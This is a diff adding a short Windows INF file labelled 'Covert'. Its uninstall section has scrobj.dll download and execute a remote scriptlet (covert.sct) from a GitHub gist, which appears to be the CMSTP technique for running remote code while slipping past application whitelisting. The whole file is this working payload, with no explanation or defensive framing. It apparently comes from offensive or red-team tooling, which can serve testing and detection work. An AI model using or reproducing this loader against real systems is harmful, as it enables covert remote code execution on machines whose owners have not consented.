@@ -1,0 +1,14 @@
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,https://gist.githubusercontent.com/wshepherd0010/c82f8656785ac3783bd41c933ff3ca6d/raw/6c462c0d4b02058e693b06fefe001f2aeac19098/covert.sct
+
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="Covert"
+ShortSvcName="Covert"
